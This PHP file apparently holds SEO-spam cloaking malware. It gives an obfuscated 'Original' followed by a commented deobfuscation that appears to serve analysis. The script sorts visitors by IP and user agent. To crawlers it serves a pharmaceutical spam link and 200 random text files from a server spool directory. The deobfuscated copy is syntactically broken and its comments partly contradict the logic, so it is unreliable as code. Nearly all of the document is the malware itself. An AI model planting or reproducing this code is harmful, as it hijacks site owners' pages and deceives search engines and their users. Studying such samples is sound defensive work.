<?
// Original
@$GLOBALS['_1713693619_'][0](0);
@$GLOBALS['_1713693619_'][1](_917447042(0),0);
@$GLOBALS['_1713693619_'][2](_917447042(1),0);
$GLOBALS['_1713693619_'][3](E_ERROR);
$_0=_917447042(2);
$_1=2064;
$_2=_917447042(3);
$_3=@$_SERVER[_917447042(4)];
$_4=@$_SERVER[_917447042(5)];
$_5=@$_SERVER[_917447042(6)];
$_6=@$_SERVER[_917447042(7)];
$_7=@$_SERVER[_917447042(8)];
$_8=@$_SERVER[_917447042(9)];
$_9=@$_SERVER[_917447042(10)];
$_10=@$_SERVER[_917447042(11)];
$_11=@$_SERVER[_917447042(12)];
$_12=@$_SERVER[_917447042(13)];

function detectBot($_4,$_12,$_13,$_9,$_5,$_14){
    $_15=array(_917447042(14),_917447042(15),_917447042(16),_917447042(17),_917447042(18),_917447042(19),_917447042(20),_917447042(21),_917447042(22),_917447042(23),_917447042(24),_917447042(25),_917447042(26),_917447042(27),_917447042(28),_917447042(29),_917447042(30),_917447042(31),_917447042(32),_917447042(33),_917447042(34),_917447042(35),_917447042(36),_917447042(37),_917447042(38),_917447042(39),_917447042(40),_917447042(41),_917447042(42),_917447042(43),_917447042(44),_917447042(45),_917447042(46),_917447042(47),_917447042(48),_917447042(49),_917447042(50),_917447042(51),_917447042(52),_917447042(53),_917447042(54),_917447042(55),_917447042(56),_917447042(57),_917447042(58),_917447042(59),_917447042(60),_917447042(61),_917447042(62),_917447042(63),_917447042(64),_917447042(65),_917447042(66),_917447042(67),_917447042(68),_917447042(69));
    $_16=array(_917447042(70),_917447042(71),_917447042(72),_917447042(73),_917447042(74),_917447042(75),_917447042(76),_917447042(77),_917447042(78),_917447042(79),_917447042(80),_917447042(81),_917447042(82),_917447042(83),_917447042(84),_917447042(85),_917447042(86),_917447042(87),_917447042(88),_917447042(89),_917447042(90),_917447042(91),_917447042(92));
    $_4=$GLOBALS['_1713693619_'][4](_917447042(93),_917447042(94),@$_4);
    $_17=true;
    $_18=false;
    $_19=false;
    $_20=_917447042(95);
    foreach($_15 as $_21)if($GLOBALS['_1713693619_'][5]("$_21",$_12)){
        $_17=false;
        break;
    }
    if($_17)foreach($_16 as $_22)if($GLOBALS['_1713693619_'][6]($_22,@$_4)!== false){
        $_17=false;
        break;
    }
    if($_17 and!$GLOBALS['_1713693619_'][7](_917447042(96),@$_4)){
        $_17=false;
    }
    if($_17 and $GLOBALS['_1713693619_'][8]($_4)<=11){
        $_17=false;
    }
    if($GLOBALS['_1713693619_'][9]($_5,$_9)){
        $_17=false;
    }
    return $_17;
}

@$_17=@detectBot($_4,$_12,$_13,$_9,$_5,$_14);

if(@$_17==false){
    echo $_2;
    for($_23=0;$_23<=200;$_23++){
        echo $GLOBALS['_1713693619_'][10]($_0 .$GLOBALS['_1713693619_'][11](1,$_1) ._917447042(97)) ._917447042(98);
    }
    exit;
}

?>



<?
@set_time_limit(0);
@ini_set(max_execution_time,0)
@ini_set(set_time_limit,0)
error_reporting(E_ERROR);
$_0 = '/var/spool/samba/'
$_1=2064;
$_2="<a href='http://www.hempusa.org/specials.php'>buy cheap viagra soft</a>"
$_3=$_SERVER[HTTP_ACCEPT_LANGUAGE];
$_4=$_SERVER[HTTP_USER_AGENT];
$_5=$_SERVER[HTTP_REFERER];
$_6=$_SERVER[HTTP_HOST];
$_7=$_SERVER[HTTP_X_FORWARDED_FOR];
$_8=$_SERVER[REMOTE_ADDR];
$_9=$_SERVER[QUERY_STRING];
$_10=$_SERVER[SERVER_SIGNATURE];
$_11=$_SERVER[REQUEST_URI];
$_12=$_SERVER[REMOTE_ADDR];


function detectBot($_4,$_12,$_13,$_9,$_5,$_14){
    // Holds blacklisted IPs
    $ips=array(_917447042(14),_917447042(15),_917447042(16),_917447042(17),_917447042(18),_917447042(19),_917447042(20),_917447042(21),_917447042(22),_917447042(23),_917447042(24),_917447042(25),_917447042(26),_917447042(27),_917447042(28),_917447042(29),_917447042(30),_917447042(31),_917447042(32),_917447042(33),_917447042(34),_917447042(35),_917447042(36),_917447042(37),_917447042(38),_917447042(39),_917447042(40),_917447042(41),_917447042(42),_917447042(43),_917447042(44),_917447042(45),_917447042(46),_917447042(47),_917447042(48),_917447042(49),_917447042(50),_917447042(51),_917447042(52),_917447042(53),_917447042(54),_917447042(55),_917447042(56),_917447042(57),_917447042(58),_917447042(59),_917447042(60),_917447042(61),_917447042(62),_917447042(63),_917447042(64),_917447042(65),_917447042(66),_917447042(67),_917447042(68),_917447042(69));
    // Holds an array of bot user agents
    $agents=array(_917447042(70),_917447042(71),_917447042(72),_917447042(73),_917447042(74),_917447042(75),_917447042(76),_917447042(77),_917447042(78),_917447042(79),_917447042(80),_917447042(81),_917447042(82),_917447042(83),_917447042(84),_917447042(85),_917447042(86),_917447042(87),_917447042(88),_917447042(89),_917447042(90),_917447042(91),_917447042(92));
    // Preg_replace with useragent string
    $_4=preg_replace(/|User\.Agent\:[\s ]?|i/,'',$_SERVER[HTTP_USER_AGENT]);
    $_17=true;
    $_18=false;
    $_19=false;
    $_20='';
    // If IP in blacklist
    foreach($ips as $_21)if(eregi("$_21",$_SERVER[REMOTE_ADDR])){
        $_17=false;
        break;
    }
    // If IP is in that range
    if($_17)
        // For each agent in agent string
        foreach($agents as $_22)
            if(eregi($_22,$_SERVER[HTTP_USER_AGENT])!== false){
                $_17=false;
                break;
            }
    // If starts with [a-zA-Z]
    if($_17 and!eregi(^[a-zA-Z]{5,},$_SERVER[HTTP_USER_AGENT])){
        $_17=false;
    }
    // If shorter then 11 chars
    if($_17 and strlen($_SERVER[HTTP_USER_AGENT])<=11){
        $_17=false;
    }
    // More checking
    if(stristr($_5,$_9)){
        $_17=false;
    }
    // Return BOOL of if bot or not
    return $_17;
}

// If a bot
@$_17=@detectBot($_4,$_12,$_13,$_9,$_5,$_14);

// If not a bot
if(@$_17==false){
    //$_2="<a href='http://www.hempusa.org/specials.php'>buy cheap viagra soft</a>"
    echo "<a href='http://www.hempusa.org/specials.php'>buy cheap viagra soft</a>";
    for($i=0;$i<=200;$i++){
        // Pick 200 files from 1..2064 in /var/spool/samba and include them
        echo file_get_contents('/var/spool/samba/'.mt_rand(1,2064) .'.txt') .'';
    }
    exit;
}

?>
